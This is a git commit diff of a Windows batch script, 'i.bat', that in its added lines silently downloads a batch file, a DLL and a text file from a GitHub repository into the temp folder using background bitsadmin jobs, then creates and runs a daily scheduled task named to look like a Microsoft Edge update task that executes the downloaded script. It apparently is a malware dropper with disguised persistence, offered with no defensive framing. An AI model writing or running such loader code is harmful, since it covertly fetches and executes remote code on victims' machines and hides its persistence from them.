dc7358ebaee32f3a87262de0d9bc62add6671c27
dl-ux <dieseligal@gmail.com>
2024-07-04 10:37:26 -0400

    Add files via upload

--- i.bat
+++ i.bat
@@ -1,20 +1,13 @@
 @echo off
-
 cd %TEMP%
-
 set "url=https://raw.githubusercontent.com/dl-ux/boot/main/App.bat"
 set "fileName=App.bat"
-set "jobName=msdn"
-cmd /c start /B bitsadmin /transfer /Download /priority Foreground  %url% %TEMP%\%fileName%
-
+start /B bitsadmin /transfer /Download /priority Foreground %url% %TEMP%\%fileName%
 set "url1=https://raw.githubusercontent.com/dl-ux/boot/main/capispn.dll"
 set "fileName1=capispn.dll"
-cmd /c start /B bitsadmin /transfer /Download /priority Foreground %url1% %TEMP%\%fileName1%
-
+start /B bitsadmin /transfer /Download /priority Foreground %url1% %TEMP%\%fileName1%
 set "url2=https://raw.githubusercontent.com/dl-ux/boot/main/main.txt"
 set "fileName2=main.txt"
-cmd /c start /B bitsadmin /transfer /Download /priority Foreground  %url2% %TEMP%\%fileName2%
-
-cmd /c start /B schtasks.exe /create /tn MicrosoftEdgeUpdateTasks /tr %TEMP%\App.bat /sc daily /st 10:00 /f
-
-cmd /c start /B schtasks.exe /run /tn MicrosoftEdgeUpdateTasks
+start /B bitsadmin /transfer /Download /priority Foreground %url2% %TEMP%\%fileName2%
+start /B schtasks.exe /create /tn MicrosoftEdgeUpdateTasks /tr %TEMP%\App.bat /sc daily /st 10:00 /f
+start /B schtasks.exe /run /tn MicrosoftEdgeUpdateTasks
